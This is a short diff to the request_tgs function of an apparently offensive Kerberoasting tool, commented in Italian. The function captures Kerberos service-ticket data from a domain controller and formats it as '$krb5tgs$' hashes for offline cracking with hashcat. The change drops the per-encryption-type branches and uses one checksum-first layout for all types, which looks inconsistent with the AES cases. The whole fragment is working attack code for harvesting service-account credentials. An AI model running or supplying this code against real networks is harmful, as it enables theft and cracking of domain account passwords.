@@ -112,18 +112,16 @@ def request_tgs(dc_ip, domain, tgt, cipher, session_key, spn):
         etype = int(enc_part['etype'])
         cipher_data = bytes(enc_part['cipher']).hex()
 
-        # Formatta hash per Hashcat
-        if etype == 23:
-            # RC4-HMAC → Hashcat mode 13100
-            hash_str = f"$krb5tgs$23$*{spn}*${domain_upper}${spn}*${cipher_data}"
-        elif etype == 17:
-            # AES128 → Hashcat mode 19600
-            hash_str = f"$krb5tgs$17$*{spn}*${domain_upper}${spn}*${cipher_data}"
-        elif etype == 18:
-            # AES256 → Hashcat mode 19700
-            hash_str = f"$krb5tgs$18$*{spn}*${domain_upper}${spn}*${cipher_data}"
-        else:
-            hash_str = f"$krb5tgs${etype}$*{spn}*${domain_upper}${spn}*${cipher_data}"
+        # Primo campo per hashcat: dev'essere privo di ':' e '/' o il parser
+        # conta male i separatori ("separator unmatched"). Usiamo la parte
+        # iniziale dell'SPN (prima della '/') come identita' simbolica.
+        spn_label = spn.split('/')[0]
+        spn_clean = spn.split(':')[0]
+        # hashcat 13100 vuole il checksum (primi 16 byte = 32 hex) separato
+        # dal resto del ticket con un '$': $krb5tgs$ETYPE$*label$realm$spn*$checksum$ticket
+        checksum = cipher_data[:32]
+        ticket = cipher_data[32:]
+        hash_str = f"$krb5tgs${etype}$*{spn_label}${domain_upper}${spn_clean}*${checksum}${ticket}"
 
         print(f"  [+] {spn} - TGS hash catturato! (etype {etype})")
         return hash_str, etype
